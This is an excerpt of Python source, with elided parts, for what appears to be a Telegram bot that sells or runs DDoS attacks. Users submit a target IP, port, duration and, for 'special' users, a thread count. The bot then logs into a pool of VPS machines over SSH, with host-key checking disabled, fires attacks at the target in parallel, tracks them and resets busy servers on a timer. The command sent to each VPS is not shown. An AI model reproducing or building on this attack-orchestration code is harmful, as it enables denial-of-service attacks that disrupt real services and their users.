...
AUTO_RESET_INTERVAL = 30  # seconds
...
async def auto_reset_vps(context: CallbackContext):
    """Automatically reset VPS to make them available for new attacks"""
    ...
    if busy_count > 0:
        ...
        logging.info(f"Auto-reset: Cleared {busy_count} busy VPS")
...
async def attack_input(update: Update, context: CallbackContext):
    global last_attack_time, running_attacks, ATTACK_HISTORY

    args = update.message.text.split()
    user_id = update.effective_user.id
    is_special = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special', False)

    # Validate argument count based on user type
    if (is_special and len(args) != 4) or (not is_special and len(args) != 3):
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        await update.message.reply_text(
            f"❌ *Invalid input!* {'Special users must provide <ip> <port> <duration> <threads>' if is_special else 'Regular attacks need <ip> <port> <duration>'}\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    ...
    try:
        if is_special:
            ...
            threads = int(threads)
            if threads > SPECIAL_MAX_THREADS:
                raise ValueError(f"Threads exceed maximum ({SPECIAL_MAX_THREADS})")
        else:
        ...
        selected_vps_list = VPS_LIST.copy()
        random.shuffle(selected_vps_list)
    ...
    attack_type = "⚡ SPECIAL ATTACK ⚡" if is_special else "⚔️ Attack"
    vps_ips = [vps[0] for vps in selected_vps_list]
    
    await update.message.reply_text(
        f"{attack_type} Started!\n"
        f"🎯 Target: {ip}:{port}\n"
        f"🕒 Duration: {duration} sec\n"
        f"{'🧵 Threads: ' + str(threads) if is_special else ''}\n"
        f"👤 User: {update.effective_user.full_name}",
        parse_mode='Markdown'
    )

    # Track the attack
    attack_id = f"{ip}:{port}-{user_id}-{time.time()}"
    ...
    async def run_attack_on_vps(vps):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ...
            logging.error(f"Error executing attack on VPS {vps[0]}: {str(e)}")
            return False, str(e)

    async def monitor_attacks():
        tasks = [run_attack_on_vps(vps) for vps in selected_vps_list]
        results = await asyncio.gather(*tasks)
        
        successful = sum(1 for success, _ in results if success)
        errors = [error for _, error in results if error is not None]
        
        # Remove the attack from running_attacks
        ...
        if successful > 0:
            await update.message.reply_text(
                f"✅ *Attack Finished on {successful} squid proxy 4*\n"
                f"🎯 *Target*: {ip}:{port}\n"
                f"🕒 *Duration*: {duration} sec\n"
                f"🧵 *Threads*: {threads}\n"
                f"👑 *Bot Owner:* {current_display_name}\n\n"
...
# Add this handler with your other handlers
    ...
    job_queue.run_repeating(auto_reset_vps, interval=AUTO_RESET_INTERVAL, first=AUTO_RESET_INTERVAL)
